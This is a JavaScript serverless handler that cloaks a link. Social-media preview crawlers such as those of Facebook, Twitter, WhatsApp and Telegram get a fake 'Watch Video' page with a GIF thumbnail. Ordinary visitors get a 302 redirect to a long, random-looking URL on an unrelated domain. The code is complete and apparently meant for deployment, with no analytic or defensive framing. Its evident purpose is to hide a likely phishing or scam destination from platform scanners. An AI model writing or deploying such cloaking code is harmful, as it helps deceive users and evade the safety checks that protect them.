export default function handler(req, res) {
  const destination =
    "https://racialburgerdiverse.com/cLKBQ-8b7dhYCG/l-wUq8Pszd8oLnw/aqSMf/w45Dil9H9M1z7LJ/-xXaaZ7p4XS8vpB1mpN/QVRwCBpucEbRpaBc/4Ink_SOIr/vI21EdYf/hWBaVWeqa/pts8goCBTwa/_n1C3Q";

  const previewImage =
    "https://pub-12531552cac144158f571ce0dfa8a9a2.r2.dev/WhatsApp%20Image%202026-09-30%20at%2011.42.57%20PM%20(1).gif";

  const ua = (req.headers["user-agent"] || "").toLowerCase();

  const crawlers = [
    "facebookexternalhit",
    "facebot",
    "twitterbot",
    "linkedinbot",
    "pinterest",
    "slackbot",
    "discordbot",
    "telegrambot",
    "whatsapp"
  ];

  const isCrawler = crawlers.some(bot => ua.includes(bot));

  if (isCrawler) {
    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">

  <title>Watch Video</title>

  <meta property="og:title" content="Watch Video">
  <meta property="og:description" content="Watch this video">
  <meta property="og:image" content="${previewImage}">
  <meta property="og:image:type" content="image/gif">
  <meta property="og:type" content="website">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Watch Video">
  <meta name="twitter:description" content="Watch this video">
  <meta name="twitter:image" content="${previewImage}">
</head>
<body></body>
</html>`;

    res.status(200);
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.setHeader("Cache-Control", "no-store");
    return res.end(html);
  }

  // Normal visitors get a real HTTP 302
  res.status(302);
  res.setHeader("Location", destination);
  res.setHeader("Cache-Control", "no-store");
  return res.end();
}
